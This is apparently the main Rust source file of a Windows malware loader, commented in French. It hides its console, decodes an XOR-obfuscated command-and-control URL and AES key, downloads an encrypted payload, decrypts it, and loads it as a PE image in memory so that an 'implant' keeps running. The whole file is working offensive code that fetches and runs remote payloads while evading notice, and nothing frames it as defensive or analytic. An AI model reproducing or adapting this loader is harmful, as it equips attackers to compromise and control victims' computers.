#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod crypto;
mod pe_loader;
mod transport;

// URL obfusquée XOR 0x5A : "https://c2.nexgate.cloud/dl2"
const OBF_URL: &[u8] = &[
    50, 46, 46, 42, 41, 96, 117, 117, 57, 104, 116, 52, 63, 34, 61, 59, 46, 63, 116, 57, 54, 53,
    47, 62, 117, 62, 54, 104,
];

// Clé AES-256 obfusquée XOR 0xA3
const OBF_KEY: &[u8] = &[
    22, 28, 178, 247, 235, 120, 119, 127, 24, 252, 35, 55, 104, 85, 100, 178, 191, 22, 26, 243,
    32, 190, 146, 66, 86, 134, 242, 123, 214, 44, 229, 48,
];

fn deobf(data: &[u8], k: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ k).collect()
}

fn main() {
    let url = match String::from_utf8(deobf(OBF_URL, 0x5A)) {
        Ok(s) => s,
        Err(_) => return,
    };
    let key_bytes = deobf(OBF_KEY, 0xA3);
    let key: [u8; 32] = match key_bytes.try_into() {
        Ok(k) => k,
        Err(_) => return,
    };

    let encrypted = match transport::download(&url) {
        Ok(d) => d,
        Err(_) => return,
    };

    let pe_data = match crypto::decrypt(&encrypted, &key) {
        Ok(d) => d,
        Err(_) => return,
    };

    unsafe {
        if pe_loader::load(&pe_data).is_err() {
            return;
        }
    }

    // Garder le thread principal en vie pendant que l'implant tourne
    loop {
        #[cfg(windows)]
        unsafe {
            windows_sys::Win32::System::Threading::Sleep(60_000);
        }
        #[cfg(not(windows))]
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
}
